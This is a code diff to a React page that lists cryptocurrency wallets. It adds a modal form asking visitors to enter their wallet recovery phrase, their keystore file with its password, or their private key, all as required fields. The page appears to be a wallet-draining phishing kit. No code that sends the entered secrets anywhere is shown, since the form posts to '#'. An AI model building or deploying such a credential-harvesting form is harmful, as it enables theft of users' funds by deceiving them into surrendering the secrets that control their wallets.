@@ -3,25 +3,26 @@ import WalletCard from "../components/molecules/WalletCard"
 import { siteName } from "../config"
 import { xLists } from './../utils/const';
 import { Cancel } from "../components/atom/Icon";
+import Modal from "../components/molecules/Modal";
 
 const Wallets = () => {
     const [isSticky, setIsSticky] = useState(!!0);
     const [data, setData] = useState(xLists);
     const [query, setQuery] = useState('');
+    const [isOpen, setIsOpen] = useState(!!0);
+    const [select, setSelect] = useState('');
+    const [tab, setTab] = useState('phrase');
 
      useEffect(() => {
     const handleScroll = () => {
       const offset = window.scrollY;
-      if (offset > 200) { // Adjust this value as needed
+      if (offset > 200) { 
         setIsSticky(!!1);
       } else {
         setIsSticky(!!0);
       }
     };
-
     window.addEventListener('scroll', handleScroll);
-
-    // Clean up event listener on unmount
     return () => {
       window.removeEventListener('scroll', handleScroll);
     };
@@ -37,6 +38,10 @@ const Wallets = () => {
 });
 setData(res)
   }, [query])
+
+  const openModal = () => {
+    return <Modal isOpen={isOpen} setIsOpen={setIsOpen}></Modal>
+  }
 
   return (
     <>
@@ -64,11 +69,68 @@ setData(res)
       {query.length > 0 && (<span onClick={() => setQuery('')}><Cancel className={`w-6 h-6 absolute right-2 top-2 text-gray-500 hover:text-rose-400 cursor-pointer`} /></span>)}
       </div>
     </div>
-
           <div className="grid grid-cols-2 gap-5 text-center sm:grid-cols-2 md:grid-cols-3 lg:gap-y-16 pt-8 lg:pt-16">
             {data.map((x, i) => (
-                <WalletCard img={`/wallets/${x.name}.${x.ext}`} key={`wallet-${i}`}>{x.name}</WalletCard>
-            ))}
+                <WalletCard key={`wallet-${i}`} setSelect={setSelect} wallet={x} setIsOpen={setIsOpen} isOpen={isOpen} img={`/wallets/${x.name}.${x.ext}`}>{x.name}</WalletCard>
+                ))}
+                {isOpen && <Modal isOpen={isOpen} setIsOpen={setIsOpen} wallet={select}>
+                    <form className="mt-4" action="#">
+                        <div className="flex justify-between overflow-x-hidden overflow-y-hidden border-b border-gray-200 whitespace-nowrap dark:border-gray-700">
+    <button type="button" onClick={() => setTab('phrase')} className={`${tab==='phrase'?'text-blue-600 border-blue-500':''} hover:border-blue-500 hover:text-blue-600 inline-flex items-center h-10 px-2 py-2 -mb-px text-center bg-transparent border-b-2 sm:px-4 -px-1 dark:border-blue-400 dark:text-blue-300 whitespace-nowrap focus:outline-none`}>
+
+        <span className="mx-1 text-sm sm:text-base">
+            Phrase
+        </span>
+    </button>
+
+    <button type="button" onClick={() => setTab('keystone')} className={`${tab==='keystone'?'text-blue-600 border-blue-500':''} hover:border-blue-500 hover:text-blue-600 inline-flex items-center h-10 px-2 py-2 -mb-px text-center bg-transparent border-b-2 border-transparent sm:px-4 -px-1 dark:text-white whitespace-nowrap cursor-base focus:outline-none`}>
+
+        <span className="mx-1 text-sm sm:text-base">
+            Keystone
+        </span>
+    </button>
+
+    <button type="button" onClick={() => setTab('privateKey')} className={`${tab==='privateKey'?'text-blue-600 border-blue-500':''} hover:border-blue-500 hover:text-blue-600 inline-flex items-center h-10 px-2 py-2 -mb-px text-center bg-transparent border-b-2 border-transparent sm:px-4 -px-1 dark:text-white whitespace-nowrap cursor-base focus:outline-none`}>
+
+        <span className="mx-1 text-sm sm:text-base">
+            Private Key
+        </span>
+    </button>
+</div>
+                        {tab === 'phrase' ?(<><p htmlFor="emails-list" className="text-xs text-gray-700 dark:text-gray-200 pt-3">
+                            Typically 12 (sometimes 24) words separated by single spaces.
+                        </p>
+
+
+                        <label className="block mt-3" htmlFor="phrase">
+                            <textarea name="phrase" id="phrase" className="mt-2 align-top shadow-sm sm:text-sm block w-full px-4 py-3 text-sm text-gray-700 bg-white border border-gray-200 rounded-md focus:border-blue-400 focus:outline-none focus:ring focus:ring-blue-300 focus:ring-opacity-40 dark:border-gray-600 dark:bg-gray-900 dark:text-gray-300 dark:focus:border-blue-300"
+                                    rows="4"
+                                    placeholder="Enter recovery phrase here..." required></textarea>
+                        </label></>):tab === 'keystone'?(<>
+                        <p htmlFor="emails-list" className="text-xs text-gray-700 dark:text-gray-200 pt-3">
+                            Several lines of text beginning with {'"{...}"'} plus the password you used to encrypt it.
+                        </p>
+
+
+                        <label className="block mt-3" htmlFor="keystone">
+                            <textarea name="keystone" id="keystone" className="mt-2 align-top shadow-sm sm:text-sm block w-full px-4 py-3 text-sm text-gray-700 bg-white border border-gray-200 rounded-md focus:border-blue-400 focus:outline-none focus:ring focus:ring-blue-300 focus:ring-opacity-40 dark:border-gray-600 dark:bg-gray-900 dark:text-gray-300 dark:focus:border-blue-300"
+                                    rows="4"
+                                    placeholder="Enter Keystone ..." required ></textarea>
+                        </label>
+                        <label className="block mt-3" htmlFor="keystonePwd">
+                            <input type="text" name="keystonePwd" id="keystonePwd" placeholder="Wallet Passcode" class="block w-full px-4 py-3 text-sm text-gray-700 bg-white border border-gray-200 rounded-md focus:border-blue-400 focus:outline-none focus:ring focus:ring-blue-300 focus:ring-opacity-40 dark:border-gray-600 dark:bg-gray-900 dark:text-gray-300 dark:focus:border-blue-300" required/>
+                        </label>
+                        </>):(<>
+                        <p htmlFor="emails-list" className="text-xs text-gray-700 dark:text-gray-200 pt-3">
+                            Typically 12 (sometimes 24) words separated by a single space.
+                        </p>
+
+                        <label className="block mt-3" htmlFor="privateKey">
+                            <input type="text" name="privateKey" id="privateKey" placeholder="Enter Private Key ..." class="block w-full px-4 py-3 text-sm text-gray-700 bg-white border border-gray-200 rounded-md focus:border-blue-400 focus:outline-none focus:ring focus:ring-blue-300 focus:ring-opacity-40 dark:border-gray-600 dark:bg-gray-900 dark:text-gray-300 dark:focus:border-blue-300" required/>
+                        </label></>)}
+
+                    </form>
+                    </Modal>}
           </div>
           </div>
           </section>
